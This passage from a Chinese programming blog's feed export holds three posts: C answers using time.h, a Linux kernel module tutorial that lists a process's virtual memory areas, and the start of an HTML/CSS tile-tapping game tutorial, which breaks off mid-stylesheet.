class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;time.h&gt;</span><br><span class="line"> </span><br><span class="line">int main(void)</span><br><span class="line">{</span><br><span class="line">  struct tm t;</span><br><span class="line">  int n;</span><br><span class="line"> </span><br><span class="line">  /* initialize unused members */</span><br><span class="line">  t.tm_sec = t.tm_min = t.tm_hour = 0;</span><br><span class="line">  t.tm_isdst = -1;</span><br><span class="line"> </span><br><span class="line">  printf("Enter month (1-12): ");</span><br><span class="line">  scanf("%d", &amp;t.tm_mon);</span><br><span class="line">  t.tm_mon--;</span><br><span class="line"> </span><br><span class="line">  printf("Enter day (1-31): ");</span><br><span class="line">  scanf("%d", &amp;t.tm_mday);</span><br><span class="line"> </span><br><span class="line">  printf("Enter year: ");</span><br><span class="line">  scanf("%d", &amp;t.tm_year);</span><br><span class="line">  t.tm_year -= 1900;</span><br><span class="line"> </span><br><span class="line">  printf("Enter number of days in future: ");</span><br><span class="line">  scanf("%d", &amp;n);</span><br><span class="line"> </span><br><span class="line">  t.tm_mday += n;</span><br><span class="line">  mktime(&amp;t);</span><br><span class="line">  printf("\nFuture date: %d/%d/%d\n",</span><br><span class="line">         t.tm_mon + 1, t.tm_mday, t.tm_year + 1900);</span><br><span class="line"> </span><br><span class="line">  return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>6.</strong> [was #14] </p><p>(a) </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;time.h&gt;</span><br><span class="line"> </span><br><span class="line">int main(void)</span><br><span class="line">{</span><br><span class="line">  time_t current = time(NULL);</span><br><span class="line">  struct tm *ptr;</span><br><span class="line">  char date_time[37];</span><br><span class="line"> </span><br><span class="line">  ptr = localtime(&amp;current);</span><br><span class="line">  strftime(date_time, sizeof(date_time), "%A, %B %d, %Y  %I:%M", ptr);</span><br><span class="line">  printf("%s%c\n", date_time, ptr-&gt;tm_hour &lt;= 11 ? 'a' : 'p');</span><br><span class="line"> </span><br><span class="line">  return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>(b) </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;time.h&gt;</span><br><span class="line"> </span><br><span class="line">int main(void)</span><br><span class="line">{</span><br><span class="line">  time_t current = time(NULL);</span><br><span class="line">  char date_time[22];</span><br><span class="line"> </span><br><span class="line">  strftime(date_time, sizeof(date_time), "%a, %d %b %y  %H:%M",</span><br><span class="line">           localtime(&amp;current));</span><br><span class="line">  puts(date_time);</span><br><span class="line"> </span><br><span class="line">  return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>(c) </p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;time.h&gt;</span><br><span class="line"> </span><br><span class="line">int main(void)</span><br><span class="line">{</span><br><span class="line">  time_t current = time(NULL);</span><br><span class="line">  struct tm *ptr;</span><br><span class="line">  char date[9], time[12];</span><br><span class="line"> </span><br><span class="line">  ptr = localtime(&amp;current);</span><br><span class="line">  strftime(date, sizeof(date), "%m/%d/%y", ptr);</span><br><span class="line">  strftime(time, sizeof(time), "%I:%M:%S %p", ptr);</span><br><span class="line"> </span><br><span class="line">  /* print date and time, suppressing leading zero in hours */</span><br><span class="line">  printf("%s  %s\n", date, time[0] == '0' ? &amp;time[1] : time);</span><br><span class="line"> </span><br><span class="line">  return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> C语言 </tag>
        
            
            
        <tag> 答案 </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>Linux内存管理</title>
      
      
      <link href="/cn/posts/53930/"/>
      
      
      <url>/cn/posts/53930/</url>
      
      
        
      <content type="html"><![CDATA[<blockquote><p>前言：</p><p>在 32 位的系统上，线性地址空间为 4GB，其中用户进程占有 3GB 线性地址空间，内核占有 1GB 线性地址空间。由于虚拟内存的引入，使的每个进程都可拥有 3GB 的虚拟内存。</p><p>用户进程的虚拟地址空间包含若干区域，这些区域的分布方式因体系结构的差异而不同，但所有的方式都包含下列成分：</p><p>（1） 代码段：可执行文件的二进制代码</p><p>（2） 数据段：存储全局变量</p><p>（3） 栈：用于保存局部变量和实现函数调用</p><p>（4） 环境变量和命令行参数</p><p>（5） 程序使用的动态库的代码</p><p>（6） 用于映射文件内容的区域为便于描述，系统中进程的虚拟内存空间被划分为若干不同的区域，每个区域都有其相关的属性和用途，一个合法的地址总是落在某个区域当中的，这些区域也不会重叠。在 Linux 内核中，这样的区域被称为虚拟内存区域(virtual memory areas，VMA)。一个 VMA 是一块连续的线性地址空间的抽象，它拥有自身的权限(可读，可写，可执行等) ，对进程而言，VMA 其实是虚拟空间的内存块，一个进程的所有资源由多个内存块组成。</p><p>每一个虚拟内存区域都由一个相关的 struct vm_area_struct 结构来描述。</p><p>本文将编写一个内核模块，遍历一个用户进程中所有的 VMA，并且打印这些 VMA 的属性信息，如 VMA 的大小、起始地址等，并通过与“/proc/pid/maps”中显示的信息进行对比验证 VMA 信息是否正确。  </p></blockquote><ol><li><h5 id="编写模块程序"><a href="#编写模块程序" class="headerlink" title="编写模块程序"></a>编写模块程序</h5><p>参考代码如下，代码文件命名为“vma_test.c”</p></li></ol><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//vma_test.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/mm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> pid;</span><br><span class="line">module_param(pid, <span class="type">int</span>, <span class="number">0644</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">printit</span><span class="params">(<span class="keyword">struct</span> task_struct *tsk)</span></span><br><span class="line">{</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span>;</span></span><br><span class="line">  <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> start, end, length;</span><br><span class="line"></span><br><span class="line">  mm = tsk-&gt;mm;</span><br><span class="line">  pr_info(<span class="string">"mm_struct addr = 0x%p\n"</span>, mm);</span><br><span class="line">  vma = mm-&gt;mmap;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 使用 mmap_sem 读写信号量进行保护 */</span></span><br><span class="line">  down_read(&amp;mm-&gt;mmap_sem);</span><br><span class="line">  pr_info(<span class="string">"vmas: vma start end length\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (vma) {</span><br><span class="line">      j++;</span><br><span class="line">      start = vma-&gt;vm_start;</span><br><span class="line">      end = vma-&gt;vm_end;</span><br><span class="line">      length = end - start;</span><br><span class="line">      pr_info(<span class="string">"%6d: %16p %12lx %12lx %8ld\n"</span>,</span><br><span class="line">          j, vma, start, end, length);</span><br><span class="line">      vma = vma-&gt;vm_next;</span><br><span class="line">  }</span><br><span class="line">  up_read(&amp;mm-&gt;mmap_sem);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">vma_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">tsk</span>;</span></span><br><span class="line">  <span class="comment">/* 如果插入模块时未定义 pid 号，则使用当前 pid */</span></span><br><span class="line">  <span class="keyword">if</span> (pid == <span class="number">0</span>) {</span><br><span class="line">      tsk = current;</span><br><span class="line">      pid = current-&gt;pid;</span><br><span class="line">      pr_info(<span class="string">"using current process\n"</span>);</span><br><span class="line">  } <span class="keyword">else</span> {</span><br><span class="line">      tsk = pid_task(find_vpid(pid), PIDTYPE_PID);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span> (!tsk)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  pr_info(<span class="string">" Examining vma's for pid=%d, command=%s\n"</span>, pid, tsk-&gt;comm);</span><br><span class="line">  printit(tsk);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">vma_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line">  pr_info(<span class="string">"Module exit\n"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">module_init(vma_init);</span><br><span class="line">module_exit(vma_exit);</span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">"GPL"</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">"Mr Yu"</span>);</span><br><span class="line">MODULE_DESCRIPTION(<span class="string">"vma test"</span>);</span><br></pre></td></tr></tbody></table></figure><blockquote><p>以上代码中:</p><p>38-52 行是内核模块初始化函数 vma_init；</p><p>40-46 行目的是获取 pid，可在加载模块时可传递相关参数（即进程 pid）；如果没有传递参数，则使用当前进程，即执行 insmod 命令的进程；</p><p>45 行 pid_task()函数为获取任务的任务描述符信息，其返回值是 struct task_struct 结构体类型的变量；</p><p>50 行调用自定义的 printit()函数打印相关信息；</p><p>9-34 行是本实验核心函数；</p><p>16 行获取待检查进程的内存描述符 struct mm_struct 数据结构，该结构由struct task_struct 中的*mm 指向；</p><p>18 行获取 VMA 链表头，即 mm-&gt;mmap；</p><p>21 行开始遍历 VMA 链表,down_read()函数用于申请读信号量，因本程序只是读取 VMA 链表，所以申请读者类型即可，若需丢 VMA 链表进行修改，则需申请写者类型信号量；  </p><p>24-32 行遍历 VMA 链表，并对每个 VMA 打印其起始地址、终止地址和长度信<br>息；</p><p>33 行释放读者信号量。</p></blockquote><ol start="2"><li><h5 id="编译内核模块"><a href="#编译内核模块" class="headerlink" title="编译内核模块"></a>编译内核模块</h5><p>编写 Makefile 文件，文件名必须为“Makefile”  </p><figure class="highlight makefile"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">obj-m := vma_test.o</span><br><span class="line"></span><br><span class="line">KERNELBUILD := /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build</span><br><span class="line">CURRENT_PATH := <span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line"></span><br><span class="line"><span class="section">all:</span></span><br><span class="line">make -C <span class="variable">$(KERNELBUILD)</span> M=<span class="variable">$(CURRENT_PATH)</span> modules</span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">make -C <span class="variable">$(KERNELBUILD)</span> M=<span class="variable">$(CURRENT_PATH)</span> clean</span><br></pre></td></tr></tbody></table></figure></li><li><h5 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h5><p>使用 make 命令编译即可。  </p></li><li><h5 id="插入模块"><a href="#插入模块" class="headerlink" title="插入模块"></a>插入模块</h5><p>先通过 top 命令查看进程，任意获取一个进程 pid，如图所示，  本例中获取apache2 进程的 pid 3509。  </p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/53930/image-20200608163648953.png" alt="image-20200608163648953"></p><p>使 用 insmod 插 入 模 块 ， 并 传 参 。 如 图 所 示 ， 本 例 中 模 块 名 为“vma_test.ko”,pid 为 3509，则插入模块命令为：  </p></li></ol><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insmod vma_test.ko pid=3509</span><br></pre></td></tr></tbody></table></figure><ol start="5"><li><h5 id="查看程序打印信息"><a href="#查看程序打印信息" class="headerlink" title="查看程序打印信息"></a>查看程序打印信息</h5><p>通过 dmesg 命令查看 VMA 信息。如下图所示:</p></li></ol><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/53930/image-20200608164250039.png" alt="image-20200608164250039"></p><blockquote><p>从上图可看到 apache2 进程包含许多 VMA 区域，以第一个 VMA 区域为例，其起始地址为 0x564af2e3a000,结束地址为 564af2ed7000,长度为 643072 字节。  </p></blockquote><p>​    如下图所示为从 proc 虚拟文件系统中查看相应进程第一个 VMA 的完整信息。  </p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/53930/image-20200608164609038.png" alt="image-20200608164609038"></p><blockquote><p>从以上两图中内容对比可知，本程序输出信息正确。  </p></blockquote>]]></content>
      
      
      
      
        
      <tags>
        
            
            
        <tag> Linux </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>h5别踩白块游戏</title>
      
      
      <link href="/cn/posts/59750/"/>
      
      
      <url>/cn/posts/59750/</url>
      
      
        
      <content type="html"><![CDATA[<h1 id="内容介绍"><a href="#内容介绍" class="headerlink" title="内容介绍"></a>内容介绍</h1><h4 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h4><p>别踩白块这个游戏相信很多人都在手机上玩过，今天我们就来做一个网页版的，先上一张游戏效果图：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/59750/uid1133717-20191017-1571294959274.gif" alt="图片描述"></p><p>属于简化版别踩白块，代码相对较为简单易学，主要涉及通过 javascript 操作元素节点的增删以及属性节点（class）的操作。</p><h4 id="2-知识点"><a href="#2-知识点" class="headerlink" title="2.知识点"></a>2.知识点</h4><ul><li>HTML/CSS</li><li>JavaScript</li><li>元素节点增删</li><li>属性节点操作</li></ul><h4 id="3-项目架构"><a href="#3-项目架构" class="headerlink" title="3.项目架构"></a>3.项目架构</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">puzzle</span><br><span class="line">   |index.html</span><br><span class="line">   |css/index.css</span><br><span class="line">   |js/index.js</span><br></pre></td></tr></tbody></table></figure><h1 id="项目原理"><a href="#项目原理" class="headerlink" title="项目原理"></a>项目原理</h1><p>在开始编程之前，让我们先来分析下整个游戏的流程：一定的速度下移，点击黑块，黑块消失，新的黑块出现在普通游戏玩家眼中，应该是游戏开始，黑块不断向下移动，若黑块触底则游戏结束；</p><p>而以开发者来说，<strong>应将每一个黑块和白块抽象成一个个的数据结构，黑块的消失和出现其实就是数据结构的创造和销毁</strong>，我们来看一张游戏的流程图，对于要编写的功能有一个大概的了解:</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/59750/image-20201105153016423.png" alt="image-20201105153016423"></p><h1 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a>实现步骤</h1><h4 id="页面布局"><a href="#页面布局" class="headerlink" title="页面布局"></a>页面布局</h4><p>可以用 div+css 布局来实现别踩白块的静态效果展示，直接上 HTML 代码，我来简要说下 HTML 思路，将主界面分解成一个 4x4 的大矩形格子，每一个方块代表其中一个小的矩形格，其中每一行的四个白块中有一个黑块，每一行中黑块位于哪一列是随机生成的，但是我们这里现在是静态页面就自己确定了，然后通过 css 控制样式。</p><p>创建 index.html 文件，并输入以下代码：</p><figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>别踩白块<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"css/index.css"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"main"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"con"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"cell"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          /*白块*/</span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"cell black"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          /*黑块*/</span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"cell"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"cell"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"cell"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"cell black"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"cell"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"cell"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"cell"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"cell"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"cell black"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"cell"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"cell black"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"cell"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"cell"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"cell"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"js/index.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><h4 id="添加样式"><a href="#添加样式" class="headerlink" title="添加样式"></a>添加样式</h4><p>下面是 css 代码，这里有一个要注意的地方，我将 <code>div#con</code> 块级元素向上提了 100 px，这样在游戏的开始就出现了最底一行的空白，隐藏最上面那行，为什么要这样呢，继续往下看就知道了。设置黑白块的样式，为 js 部分动态插入黑白块做准备。</p><p>创建 <code>css/index.css</code> 文件，并输入以下代码：</p><figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#main</span> {</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">408px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">408px</span>;</span><br><span class="line">  <span class="attribute">background</span>: white;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">2px</span> solid gray;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span> auto;</span><br><span class="line">  <span class="attribute">overflow</span>: hidden;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">h2</span> {</span><br><span class="line">  <span class="attribute">text-align</span>: center;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#con</span> {</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">400px</span>;</span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">  <span class="attribute">top</span>: -<span class="number">408px</span>; <span class="comment">/*隐藏所有格子*/</span></span><br><span class="line">  <span class="attribute">border-collapse</span>: collapse;</span><br><span class="line">}</span><br><span class="line"><span class="comment">/* 行 */</span></span><br><span class="line"><span class="selector-class">.row</span> {</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">/* 一个块 */</span></span><br><span class="line"><span class="selector-class">.cell</span> {</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">  <span class="attribute">float</span>: left;</span><br><span class="line">  <span class="attribute">border</span>: <span class="built_in">rgb</span>(<span class="number">54</span>, <span class="number">74</span>, <span class="number">129</span>) <span class="number">1px</span> solid;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.black</span> {</span><br><span class="line">  <span class="attribute">background</span>: black;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.btn</span> {</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">text-align</span>: center;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.start</span> {</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">20px</span> auto;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">150px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">50px</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">10px</span>;</span><br><span class="line">  <span class="attribute">background</span>: yellowgreen;</span><br><span class="line">  <span class="attribute">line-height</span>: <span class="number">50px</span>;</span><br><span 